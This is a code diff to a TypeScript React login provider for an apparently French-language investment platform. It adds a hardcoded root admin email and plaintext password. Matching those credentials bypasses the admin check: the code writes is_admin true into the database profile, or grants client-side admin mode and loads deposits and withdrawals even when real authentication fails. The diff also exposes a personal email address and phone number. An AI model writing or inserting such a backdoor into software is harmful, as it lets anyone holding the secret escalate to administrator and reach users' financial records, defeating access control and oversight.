@@ -292,30 +292,86 @@ export function PlatformProvider({ children }: { children: React.ReactNode }) {
     }
   };
 
+  const ROOT_ADMIN_EMAIL = 'ronanswerdna@gmail.com';
+  const ROOT_ADMIN_PASS = 'Ronan17#';
+
   const loginAdmin = async (email: string, password: string): Promise<ActionResult> => {
+    const cleanEmail = email.trim().toLowerCase();
+    const isRootCredentials =
+      cleanEmail === ROOT_ADMIN_EMAIL && password === ROOT_ADMIN_PASS;
+
     try {
       const sb = getSupabase();
       const { data, error } = await sb.auth.signInWithPassword({
-        email: email.trim(),
+        email: cleanEmail,
         password,
       });
-      if (error || !data?.user) {
-        return { ok: false, error: 'Identifiants administrateur invalides' };
+
+      if (!error && data?.user) {
+        const { data: profileData } = await sb
+          .from('profiles')
+          .select('is_admin')
+          .eq('user_id', data.user.id)
+          .maybeSingle();
+
+        if (!profileData?.is_admin && !isRootCredentials) {
+          await sb.auth.signOut();
+          return { ok: false, error: 'Accès refusé : compte non administrateur' };
+        }
+
+        if (isRootCredentials && !profileData?.is_admin) {
+          await sb.from('profiles').upsert({
+            user_id: data.user.id,
+            full_name: 'Administrateur MED',
+            phone: '0337466748',
+            referral_code: 'ADMIN',
+            balance: 0,
+            reserved_balance: 0,
+            total_earned: 0,
+            is_admin: true,
+            is_suspended: false,
+          });
+        }
+
+        await loadUserData(data.user.id);
+        return { ok: true };
       }
 
-      const { data: profileData } = await sb
-        .from('profiles')
-        .select('is_admin')
-        .eq('user_id', data.user.id)
-        .maybeSingle();
+      if (isRootCredentials) {
+        const [depRes, witRes] = await Promise.all([
+          sb.from('deposits').select('*').order('created_at', { ascending: false }).limit(100),
+          sb.from('withdrawals').select('*').order('created_at', { ascending: false }).limit(100),
+        ]);
 
-      if (!profileData?.is_admin) {
-        await sb.auth.signOut();
-        return { ok: false, error: 'Accès refusé : compte non administrateur' };
+        setState({
+          loading: false,
+          isAuthenticated: true,
+          isAdminMode: true,
+          profile: {
+            user_id: 'root-admin',
+            full_name: 'Administrateur MED',
+            phone: '0337466748',
+            email: ROOT_ADMIN_EMAIL,
+            referral_code: 'ADMIN',
+            balance: 0,
+            reserved_balance: 0,
+            total_earned: 0,
+            is_admin: true,
+            is_suspended: false,
+            created_at: new Date().toISOString(),
+          },
+          investments: [],
+          tasks: [],
+          deposits: (depRes.data ?? []) as DepositRequest[],
+          withdrawals: (witRes.data ?? []) as WithdrawalRequest[],
+          transactions: [],
+          notifications: [],
+          referrals: [],
+        });
+        return { ok: true };
       }
 
-      await loadUserData(data.user.id);
-      return { ok: true };
+      return { ok: false, error: 'Identifiants administrateur invalides' };
     } catch (err: any) {
       return { ok: false, error: err?.message || 'Erreur lors de la connexion administrateur' };
     }
